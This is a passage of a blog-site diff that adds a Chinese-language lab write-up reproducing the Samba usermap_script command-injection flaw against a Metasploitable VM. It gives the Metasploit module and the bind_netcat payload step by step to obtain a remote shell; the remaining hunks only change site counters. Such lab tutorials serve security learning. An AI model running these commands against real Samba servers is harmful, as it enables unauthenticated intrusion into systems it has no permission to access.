+<p>这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。<br>通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。<br>不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>攻击机 kali<br>IP 192.168.195.133</p>
+<p>靶机 Metasploitable_ubuntu<br>IP 192.168.195.132</p>
+<ol>
+<li>搜索有关<code>samba</code>漏洞的代码库<blockquote>
+<p>search samba</p>
+</blockquote>
+</li>
+<li>使用<code>usermap_script</code>代码<blockquote>
+<p>use exploit/multi/samba/usermap_script</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8805e6ee37bebf29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<ol start="3">
+<li>查看攻击载荷 <blockquote>
+<p>show payloads</p>
+</blockquote>
+</li>
+</ol>
+<p>并选择bind_netcat即使用netcat工具在渗透攻击成功后执行shell并通过netcat绑定在一个监听端口上</p>
+<blockquote>
+<p>set payload cmd/unix/bind_netcat</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-cf8879b9a08ad902.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+<ol start="4">
+<li>查看参数配置<blockquote>
+<p>show options</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7d20c70d09d1e160.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
+<ol start="5">
+<li>设置目标<code>ip</code><blockquote>
+<p>set RHOST 192.168.195.132</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b4e95900980507e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
+<ol start="6">
+<li>执行<code>exploit</code>成功获取靶机<code>shell</code><blockquote>
+<p>exploit</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-926ca534e06b2225.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
+
           
         
       
@@ -1625,7 +1994,7 @@ print (l3)        #输出 [11, 12, 13, 22, 24, 26, 33, 36, 39]
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1636,7 +2005,7 @@ print (l3)        #输出 [11, 12, 13, 22, 24, 26, 33, 36, 39]
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
